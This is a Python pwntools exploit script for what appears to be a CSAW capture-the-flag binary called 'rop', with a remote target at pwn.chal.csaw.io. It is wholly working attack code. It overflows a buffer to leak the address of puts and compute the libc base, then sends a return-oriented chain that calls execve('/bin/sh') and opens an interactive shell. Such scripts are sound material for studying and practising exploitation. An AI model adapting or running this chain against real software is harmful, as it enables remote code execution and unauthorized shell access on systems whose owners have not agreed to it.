from pwn import *

debug = False
elf = ELF('./rop')
if (debug == True):
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    pop_rax = 0x43a78
    pop_rdi = 0x2155f
    pop_rsi = 0x23e8a
    pop_rdx = 0x1b96
    syscall = 0x13c0
    p = process('./rop')
else:
    libc = ELF('libc-2.27.so')
    pop_rax = 0x43a78
    pop_rdi = 0x2155f
    pop_rsi = 0x23e8a
    pop_rdx = 0x1b96
    syscall = 0x13c0
    p = remote('pwn.chal.csaw.io', 5016)

payload = 'A'*40+p64(0x400683)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(0x4005dc)

print p.recv()
p.sendline(payload)
libc.address = u64(p.recv(6)+'\x00\x00')-libc.sym['puts']
print 'libc: ', hex(libc.address)
print p.recv()
payload = 'A'*40+p64(libc.address+pop_rax)+p64(59)+p64(libc.address+pop_rdi)+p64(libc.search('/bin/sh').next())+p64(libc.address+pop_rsi)+p64(0)+p64(libc.address+pop_rdx)+p64(0)+p64(libc.address+syscall)
print 'payload: ', payload
p.sendline(payload)
p.interactive()
